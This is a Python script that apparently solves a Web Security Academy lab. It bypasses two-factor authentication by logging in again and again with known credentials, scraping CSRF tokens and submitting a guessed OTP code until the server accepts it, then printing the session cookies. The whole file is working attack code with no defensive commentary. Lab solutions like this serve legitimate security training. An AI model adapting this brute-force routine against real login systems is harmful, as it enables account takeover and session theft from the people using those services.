import requests
from colorama import Fore
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

login_url = 'https://0af600f00448fe2a847eb6af005500f9.web-security-academy.net//login'
otp_url = 'https://0af600f00448fe2a847eb6af005500f9.web-security-academy.net/login2'
dashboard_url = 'https://0af600f00448fe2a847eb6af005500f9.web-security-academy.net/my-account'


#Get CSRf Token
def get_csrf(url, session):
    res = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

#To perform initial login
def login(session):
    csrf = get_csrf(login_url, session)
    data = {'csrf':csrf,
            'username': 'carlos',
            'password': 'montoya'
            }
    response = session.post(login_url, data=data, verify=False, proxies=proxies, allow_redirects=False)
    return response

# To handle the 2FA process
def submit_otp(session, otp_str):
    csrf = get_csrf(otp_url, session)
    data={'csrf':csrf,
          'mfa-code':otp_str}
    response = session.post(otp_url, data=data, proxies=proxies, verify=False, allow_redirects=False)  # Disable auto redirects
    print(f"DEBUG: OTP submission response status code: {response.status_code}")
    return response


# Brute-force process to attempt login & submit the hardcoded OTP until success
def try_until_success():
    otp_str = '0571'

    while True:  # Keep trying until success
        session = requests.Session()
        login_response = login(session)
        
        if login_response.status_code == 302:
            print(f"{Fore.WHITE}Logged in successfully")
        else:
            print(f"{Fore.RED}Failed to log in")
            break

        print(f"Trying OTP: {otp_str}")
        mfa_response = submit_otp(session, otp_str)
        redirect_location = mfa_response.headers.get('Location', '')

        if redirect_location:
            print(f"{Fore.GREEN}{mfa_response.text}")
            print(f"{Fore.GREEN}Location: {redirect_location}")
            print(f"{Fore.GREEN}Session cookies: {session.cookies.get_dict()}")
            return False
        else:
            print(f"{Fore.RED}Incorrect security code")
            print(f"{Fore.WHITE}Retrying...")

try_until_success()
